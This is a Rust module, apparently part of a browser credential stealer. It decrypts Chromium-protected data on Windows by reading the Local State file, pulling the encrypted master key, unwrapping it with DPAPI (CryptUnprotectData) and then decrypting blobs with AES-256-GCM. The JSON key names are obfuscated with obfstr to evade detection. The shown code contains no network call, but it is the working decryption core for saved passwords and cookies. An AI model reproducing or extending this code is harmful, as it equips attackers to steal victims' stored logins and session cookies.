pub fn decrypt_blob(blob: Vec<u8>, profile: &mut super::utils::Profile) -> Option<Vec<u8>> {

    if profile.local_state.is_empty() {
        // <V80
        return crypt_unprotect_data(blob.clone().as_mut_slice()).ok();
    }

    if profile.localstate_cache.is_none() {
        let local_state = std::fs::read_to_string(profile.local_state.clone()).ok()?;
        let local_state: serde_json::Value = serde_json::from_str(&local_state).ok()?;
        let key = local_state[obfstr::obfstr!("os_crypt")][obfstr::obfstr!("encrypted_key")].as_str().or(None);
    
        if key.is_none() {
            return None;
        }
    
        let encrypted_token = &mut base64::decode(key.unwrap()).ok()?[5..];
    
        let key = crypt_unprotect_data(encrypted_token).ok()?;

        profile.localstate_cache = Some(key);

    }

    let key = &mut profile.localstate_cache.clone().unwrap()[..];
    match aes_gcm(key, &blob) {
        Ok(data) => Some(data),
        Err(_) => None,
    }
}


fn aes_gcm(key: &mut [u8], buffer: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {

    if buffer.len() < 15 {
        return Err("".into());
    }
    
    let key = GenericArray::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = GenericArray::from_slice(&buffer[3..15]);
    let plaintext = cipher
        .decrypt(nonce, &buffer[15..]);

    match plaintext {
        Ok(data) => Ok(data),
        Err(_) => Err("".into()),
    }
}

use aes::cipher::generic_array::GenericArray;
use aes_gcm::{NewAead, Aes256Gcm};
use aes_gcm::aead::Aead;
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
fn crypt_unprotect_data(buffer: &mut [u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let buf_ptr = buffer.as_mut_ptr();
    let mut data_in = CRYPT_INTEGER_BLOB {
        cbData: buffer.len() as u32,
        pbData: buf_ptr,
    };

    unsafe {
        let mut output = std::mem::zeroed();
    
        let result = CryptUnprotectData(
            &mut data_in,
            None,
            None,
            None,
            None,
            0,
            &mut output,
        );

        if result.is_err() {
            return Err(std::io::Error::last_os_error().into());
        }

        Ok(Vec::from_raw_parts(output.pbData,  output.cbData as _, output.cbData as _,))
    
    }
}
